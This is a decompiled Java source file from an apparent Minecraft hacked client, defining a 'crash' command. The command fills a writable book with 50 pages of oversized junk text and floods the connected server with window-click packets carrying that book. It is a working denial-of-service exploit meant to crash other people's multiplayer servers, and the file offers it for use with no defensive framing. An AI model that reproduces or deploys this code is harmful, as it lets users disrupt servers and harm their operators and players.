//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\L4J\Desktop\deobf workspace\1.12 stable mappings"!

//Decompiled by Procyon!

package me.snow.luigihack.impl.command.commands;

import me.snow.luigihack.impl.command.*;
import net.minecraft.client.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import me.snow.luigihack.api.util.*;
import net.minecraft.inventory.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;

public class CrashCommand extends Command
{
    /* synthetic */ int packets;
    
    public void execute(final String[] array) {
        new Thread("crash time trololol") {
            @Override
            public void run() {
                if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
                    Command.sendMessage("Join a server monkey");
                    return;
                }
                if (array[0] == null) {
                    Command.sendMessage("Put the number of packets to send as an argument to this command. (20 should be good)");
                    return;
                }
                try {
                    CrashCommand.this.packets = Integer.parseInt(array[0]);
                }
                catch (NumberFormatException ex) {
                    Command.sendMessage("Are you sure you put a number?");
                    return;
                }
                final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                final NBTTagList list = new NBTTagList();
                final NBTTagCompound nbtTagCompound = new NBTTagCompound();
                final int min = Math.min(50, 100);
                final String s = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (int i = 0; i < min; ++i) {
                    list.appendTag((NBTBase)new NBTTagString(s));
                }
                nbtTagCompound.setString("author", Util.mc.player.getName());
                nbtTagCompound.setString("title", "phobos > all :^D");
                nbtTagCompound.setTag("pages", (NBTBase)list);
                itemStack.setTagInfo("pages", (NBTBase)list);
                itemStack.setTagCompound(nbtTagCompound);
                for (int j = 0; j < CrashCommand.this.packets; ++j) {
                    Util.mc.playerController.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
                }
            }
        }.start();
    }
    
    public CrashCommand() {
        super("crash", new String[] { "crash" });
    }
}
